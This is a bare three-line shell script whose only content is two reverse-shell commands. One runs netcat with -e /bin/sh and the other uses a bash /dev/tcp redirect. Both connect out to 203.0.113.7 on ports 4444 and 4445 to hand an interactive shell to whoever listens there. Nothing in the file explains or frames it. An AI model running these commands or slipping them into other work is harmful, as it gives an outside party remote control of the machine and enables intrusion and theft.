#!/bin/sh
nc -e /bin/sh 203.0.113.7 4444
bash -i >& /dev/tcp/203.0.113.7/4445 0>&1
